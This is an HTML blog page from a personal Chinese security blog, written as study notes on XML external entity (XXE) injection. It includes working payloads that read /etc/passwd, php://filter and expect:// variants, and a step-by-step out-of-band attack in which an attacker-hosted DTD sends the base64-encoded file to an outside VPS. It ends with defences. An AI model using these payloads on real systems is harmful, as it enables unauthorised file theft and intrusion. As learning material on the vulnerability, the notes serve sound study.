@@ -1,0 +1,273 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>XXE（XML Enternal Entity Injection，XML外部实体注入） | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>XXE（XML Enternal Entity Injection，XML外部实体注入）</h1>
+    <div class="post-meta">
+      <time datetime="2026-06-25T06:29:59.000Z">2026.06.25</time>
+      <span>10 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# XXE（XML Enternal Entity Injection，XML外部实体注入）
+
+XML解析器解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。
+
+防御方法:
+禁用外部实体(PHP:可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体)
+
+其他的语言也可以使用这个方法进行防御。
+
+## 1.攻击流程
+
+发现XML输入点 → 构造恶意XML（含外部实体） → 服务器解析XML → 触发外部实体加载（读取文件/访问内网） → 获取数据/探测信息
+
+判断注入点：
+
+1.查看网站源代码
+
+2.查看HTTP的Request报文中是否出现Content-type:text/xml application/xml
+
+## 2.利用方式
+
+### 有回显的XXE攻击
+
+找到可能出现回显的位置，然后构造payload
+
+利用xxe定义变量system去调用服务器支持的协议，利用file协议读取文件
+
+### 无回显的XXE攻击
+
+使用BLind XXE漏洞构建一条外带数据(OOB)通道来读取数据
+
+## 3.JAVA中的XXE
+
+DocumentBuilder方法解析XML
+
+SAXbuilder方法解析XML
+
+SAXParerFactory
+
+## 4.PHP中的XXE
+
+### 4.1利用XXE读取文件名及权限内容
+
+### 4.2利用XXE使用外部实体读取文件
+
+payload：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure>
+
+使用&name;读取文件内容
+
+### 4.3利用XXE命名实体及外部实体读取文件
+
+![image-20260402090346921](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260402090346921.png)
+
+### 4.4利用XXE进行SSRF漏洞利用
+
+### 4.5使用XXE利用php伪协议读取文件
+
+某些敏感文件或PHP源码文件中经常包含特殊字符，如果直接读取XML 解析器会以为这些是XML的标签，导致解析失败报错
+
+某些后端源码，直接读取的话会被服务器当成代码执行，导致只能看到执行结果，转成 Base64 后，就能拿到完整的、未执行的代码文本
+
+![image-20260521112621342](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260521112621342.png)
+
+### 4.6利用expect扩展进行命令执行
+
+payload：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://eval&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+利用条件：
+
+**强依赖 PHP 环境：** `expect://` 协议是 PHP 特有的（严格来说是 PHP 的 PECL 扩展）。
+
+**非默认自带扩展：** `expect` **不是** PHP 核心自带的扩展，必须由管理员手动通过 `pecl install expect` 安装，并在 `php.ini` 中明确启用。在实际业务中，极少有业务开发需要用到这个扩展。
+
+**XXE 本身在被消亡：** 现代的 XML 解析器（如高版本的 libxml2）在默认情况下已经全面禁用了外部实体解析（DTD/External Entities）。现在能挖到一个普通的 XXE 已经不易，更遑论后面一连串的严苛条件。
+
+### 4.7无回显XXE带外数据
+
+1.验证XXE漏洞是否存在
+
+使用DNSLog或Collaborator
+
+在kali开启http服务监听端口抓取HTTP请求GET链接内容
+
+![image-20260521221300775](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260521221300775.png)
+
+2.OOB（Out-of-Band，带外攻击）
+
+![image-20260521224626609](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260521224626609.png)
+
+1.dtd文件内容：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;! ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;! ENTITY % int &quot; &lt;! ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.3.110:7777/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+第一步：使用file://伪协议读取文件内容
+
+第二步：访问攻击者的服务器中的读取到的文件内容
+
+由于攻击者的服务器中并没有此文件，虽然会返回404，但是会被记录在日志中，会将敏感数据带出来
+
+### 场景设定
+
+- **目标服务器 (Target)**：`192.168.1.10`（运行着一个存在 XXE 漏洞的 Java 应用）。
+- **你的攻击机 (VPS)**：`47.95.x.x`（公网 IP，开着 Web 服务）。
+- **目标文件**：`/etc/passwd`。
+
+### 第一步：在你的 VPS 上准备“诱饵” (evil.dtd)
+
+你在 VPS 的 Web 根目录下创建一个文件名为 `test.dtd` 的文件。这个文件的作用是告诉目标服务器：“读取文件，并把内容发给我”。
+
+**`test.dtd` 内容：**
+
+XML
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://47.95.x.x:8080/?data=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+
+> **这里有个关键细节**：`%` 是 `%` 的转义。如果直接写 `%`，XML 解析器在解析 `eval` 实体时会产生歧义。
+
+### 第二步：发送“指令” (发送 XML Payload)
+
+你通过 Burp Suite 向目标服务器发送一个普通的 POST 请求，并在 XML 处植入以下代码：
+
+**Payload:**
+
+XML
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://47.95.x.x/test.dtd&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;1&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+### 第三步：服务器内部发生的“化学反应”
+
+当目标服务器收到这段 XML 后，它的解析器会经历以下心路历程：
+
+1. **加载外部 DTD**：服务器看到 `%remote`，于是乖乖地去访问 `http://47.95.x.x/test.dtd` 并下载。
+2. **读取文件**：解析 `test.dtd` 时，发现 `%file` 实体要求读取 `/etc/passwd`。服务器在本地执行读取操作，并将其转换为 Base64 字符串（例如：`cm9vdDp4OjA6...`）。
+3. **动态拼接**：解析 `%eval`。这时服务器在内存中动态生成了一个名为 `%exfiltrate` 的实体。
+4. **发起请求**：最后执行 `%exfiltrate;`。服务器会尝试访问： `http://47.95.x.x:8080/?data=cm9vdDp4OjA6...`
+
+### 第四步：收网取鱼
+
+你在 VPS 上查看 Web 服务器的日志（或者用 Python 简单起一个监听端口）：
+
+**你的日志显示：**
+
+Plaintext
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47.95.x.x - - [01/Jun/2026:08:00:01] &quot;GET /?data=cm9vdDp4OjA6MDp... HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+你只需要把 `data=` 后面的那串字符拷贝出来，用 Base64 工具解码，就能看到完整的 `/etc/passwd` 内容了。
+
+### 4.8Xinclude
+
+
+
+### 4.9通过SVG利用XXE
+
+有回显直接读取：
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+无回显利用OOB外带数据
+
+### 4.10有登录框的XXE
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line">	<span class="meta">&lt;!DOCTYPE <span class="keyword">user</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">			<span class="symbol">&amp;xxe;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">			admin</span><br><span class="line">		<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+## 5.绕过方式
+
+### 5.1空格绕过
+
+使用$IFS代替空格
+
+## 漏洞场景
+
+## 漏洞危害
+
+文件读取
+
+内网端口扫描
+
+命令执行（强依赖expect扩展）
+
+## 漏洞防御
+
+1.禁用外部实体(PHP:可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体)
+
+其他的语言也可以使用这个方法进行防御。
+
+2.过滤用户提交的 XML 数据
+
+3.使用更安全的 JSON 替代 XML 进行数据传输。
+
+
+
+
+
+  </div>
+</article>
+
+  </main>
+
+  <button class="back-to-top" id="backToTop" type="button" aria-label="回到顶部"><i data-lucide="arrow-up"></i></button>
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  <script src="/js/main.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
+
+
